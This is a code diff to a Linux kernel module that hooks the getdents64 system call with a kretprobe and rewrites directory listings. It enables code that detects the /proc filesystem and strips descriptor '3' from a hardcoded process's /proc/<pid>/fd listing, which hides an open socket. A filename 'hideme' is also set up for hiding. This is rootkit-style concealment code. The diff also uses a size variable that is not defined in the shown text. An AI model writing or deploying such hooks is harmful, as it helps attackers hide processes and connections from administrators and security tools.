@@ -12,7 +12,7 @@
 
 /// const file name to hide
 const char* hide_file_name = "hideme";
-const char* hide_pid_path = "/3504/fd";
+const char* hide_pid_path = "/8125/fd";
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -77,56 +77,36 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 
     pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
 
-//    unsigned long offset = 0;
-//
-//    if(retval < 200){
-//        // find entry to hide
-//        while(offset < retval){
-//            struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
-//            pr_info("found %s\n", current_ent->d_name);
-//
-////            if(strcmp(current_ent->d_name, hide_file_name) == true){
-////                pr_info("hide %s\n", current_ent->d_name);
-////                break;
-////            }
-//            offset += current_ent->d_reclen;
-//        }
-//    }
+    // filter socket
+    char fd_path[256];
 
+    struct file* file = files_lookup_fd_raw(current->files, args->fd);
+    struct dentry* dentry = file->f_path.dentry;
+    char* path = dentry_path_raw(dentry, fd_path, 256);
 
-//    // filter by name
-//    unsigned int new_size = hide_entry(args->buffer_ptr, retval, hide_entry_by_name, (void*)hide_file_name);
-//    regs_set_return_value(regs, new_size);
+    struct super_block* sb= file->f_path.mnt->mnt_sb;
 
-//    // filter socket
-//    char fd_path[256];
-//
-//    struct file* file = files_lookup_fd_raw(current->files, args->fd);
-//    struct dentry* dentry = file->f_path.dentry;
-//    char* path = dentry_path_raw(dentry, fd_path, 256);
-//
-//    struct super_block* sb= file->f_path.mnt->mnt_sb;
-//
-//    // checking if the vfs is proc
-//    if(strcmp(sb->s_id, "proc") == 0){
-//        if(strcmp(path, hide_pid_path) == 0){
-//            pr_info("found usage in path=%s\n", path);
-//
-//            {
-//                unsigned long offset = 0;
-//
-//                // find entry to hide
-//                while(offset < retval){
-//                    struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
-//                    pr_info("name=%s\n", current_ent->d_name);
-//                    offset += current_ent->d_reclen;
-//                }
-//            }
-//
-//            unsigned int new_size2 = hide_entry(args->buffer_ptr, new_size, hide_entry_by_name, "3");
-//            regs_set_return_value(regs, new_size2);
-//        }
-//    }
+    // checking if the vfs is proc
+    if(strcmp(sb->s_id, "proc") == 0){
+        if(strcmp(path, hide_pid_path) == 0){
+            pr_info("found usage in path=%s\n", path);
+
+            {
+                unsigned long offset = 0;
+
+                // find entry to hide
+                while(offset < new_size){
+                    struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
+                    pr_info("name=%s\n", current_ent->d_name);
+                    offset += current_ent->d_reclen;
+                }
+            }
+
+            char* fd_name = "3";
+            unsigned int new_size2 = hide_entry(args->buffer_ptr, new_size, hide_entry_by_name, fd_name);
+            regs_set_return_value(regs, new_size2);
+        }
+    }
 
     return 0;
 }
